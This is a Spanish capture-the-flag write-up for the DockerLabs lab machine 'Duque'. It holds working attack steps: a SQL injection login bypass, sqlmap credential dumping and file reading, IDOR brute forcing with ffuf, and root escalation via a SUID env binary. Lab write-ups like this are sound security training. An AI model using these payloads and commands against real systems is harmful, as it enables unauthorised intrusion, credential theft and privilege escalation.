# Máquina: Duque — DockerLabs

**Dificultad:** Fácil  
**SO:** Ubuntu 22.04 LTS  
**IP objetivo:** `172.17.0.2`  
**Técnicas:** SQL Injection · SQLMap · IDOR · Fuerza bruta de IDs · SUID env

---

## Flujo del ataque

```
Ping → Nmap (SSH + HTTP) → ffuf → /bills/panel.php → SQLi (mario)
→ SQLMap (dump users → admin:admin123) → Login admin → IDOR (xyc724)
→ Credenciales duque → SSH → SUID env → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.061 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                      |
|--------|--------|----------|------------------------------|
| 22/tcp | open   | SSH      | OpenSSH 8.9p1 Ubuntu         |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.52 (Ubuntu) |

---

## 2. Enumeración web

```bash
ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt \
  -u http://172.17.0.2/FUZZ \
  -recursion -e .php,.html -v -o ffufscan
```

| URL | Estado | Descripción |
|-----|--------|-------------|
| `/intranet/` | 200 | Portal de intranet |
| `/bills/` | 301 | Sistema de facturación |
| `/bills/index.php` | 200 | Login del sistema de facturas |
| `/bills/panel.php` | 302 | Panel de gestión (redirige al login) |

El flag `-recursion` hace que ffuf lance un nuevo job de fuzzing dentro de cada directorio encontrado, descubriendo rutas anidadas automáticamente.

---

## 3. SQL Injection — Acceso inicial

El login de `/bills/index.php` es vulnerable a SQL Injection. Probando en el campo usuario:

```
' OR 1=1-- -
```

El servidor autentica la sesión como `mario`, el primer usuario de la base de datos. Mario es un usuario normal sin acceso al panel de administración.

---

## 4. SQLMap — Dump de credenciales

```bash
sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --dump \
  --batch
```

SQLMap detecta tres tipos de inyección en `username`: boolean-based blind, time-based blind y UNION query. La UNION query permite extraer datos directamente en la respuesta HTTP. Con `--dump` vuelca todas las tablas de la base de datos actual y `--batch` acepta las opciones por defecto sin interrumpir la ejecución.

```
Database: register
Table: users
+----+-----------+----------+
| id | passwd    | username |
+----+-----------+----------+
| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |
+----+-----------+----------+
```

Credenciales de admin: `admin:admin123`

---

## 5. IDOR — Fuerza bruta de IDs de factura

Iniciando sesión como `admin`, el panel expone facturas con IDs en el formato `xy[letra][3 dígitos]` via parámetro GET (`?id=xya456`). Generamos todas las combinaciones y filtramos por tamaño de respuesta:

```bash
ffuf -w <(for l in {a..z}; do for n in {0..9}{0..9}{0..9}; do echo "$l$n"; done; done) \
  -u "http://172.17.0.2/bills/panel.php?id=xyFUZZ" \
  -H "Cookie: PHPSESSID=edptot42qkohno15r27g1jfqif" \
  -mr "Detalle de Factura" \
  -c -t 20 -fs 5906
```

La wordlist se genera inline: el doble bucle crea las 26.000 combinaciones posibles. El flag `-fs 5906` filtra las respuestas genéricas, dejando visible solo la anómala.

```
c724   [Status: 200, Size: 5994]   ← tamaño diferente al resto (6163)
```

### Método alternativo — SQLMap LOAD_FILE

```bash
sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=edptot42qkohno15r27g1jfqif" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --sql-query="SELECT LOAD_FILE('/var/www/html/bills/panel.php')" \
  --batch
```

El código fuente de `panel.php` revela directamente el ID vulnerable (`xyc724`) y sus credenciales.

### Credenciales en la factura vulnerable

Accediendo a `/bills/panel.php?id=xyc724`:

```
USUARIO:    duque
PASSWORD:   duquelaje81029557!
```

---

## 6. Acceso inicial — SSH

```bash
ssh duque@172.17.0.2
# Password: duquelaje81029557!
```

```
duque@43d9201f9135:~$
```

---

## 7. Escalada de privilegios — SUID env

`duque` no tiene permisos sudo. Buscamos binarios con SUID:

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

```
-rwsr-xr-x 1 root root 43976 Jan 23 10:51 /usr/bin/env
```

`/usr/bin/env` tiene el bit SUID con propietario root. El flag `-p` de `/bin/sh` preserva el `euid=0` en lugar de descartarlo.

Referencia: [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/#suid)

```bash
/usr/bin/env /bin/sh -p
```

```
# id
uid=1000(duque) gid=1000(duque) euid=0(root) groups=1000(duque)

# whoami
root
```

---

## Credenciales

| Usuario | Contraseña           | Método                        |
|---------|----------------------|-------------------------------|
| mario   | mario123             | SQLi bypass + SQLMap dump     |
| jesus   | jesus2026            | SQLMap dump                   |
| admin   | admin123             | SQLMap dump                   |
| duque   | duquelaje81029557!   | IDOR en factura xyc724        |
| root    | —                    | SUID /usr/bin/env -p          |

---

## Referencias

- [SQLMap](https://sqlmap.org/)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — IDOR](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf)
- [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/#suid)
- [ffuf](https://github.com/ffuf/ffuf)
